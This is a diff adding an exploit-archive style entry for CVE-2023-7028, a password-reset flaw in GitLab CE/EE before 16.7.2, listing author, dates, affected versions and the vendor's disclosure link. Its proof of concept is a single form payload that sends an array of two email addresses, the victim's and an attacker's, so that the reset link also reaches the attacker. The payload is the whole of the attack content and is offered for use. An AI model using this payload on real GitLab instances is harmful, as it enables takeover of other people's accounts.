@@ -1,0 +1,12 @@
+# Exploit Title: GitLab CE/EE < 16.7.2 - Password Reset
+# Exploit Author: Sebastian Kriesten (0xB455)
+# Twitter: https://twitter.com/0xB455
+
+# Date: 2024-01-12
+# Vendor Homepage: gitlab.com
+# Vulnerability disclosure: https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/
+# Version: <16.7.2, <16.6.4, <16.5.6
+# CVE: CVE-2023-7028
+
+Proof of Concept:
+user[email][]=valid@email.com&user[email][]=attacker@email.com
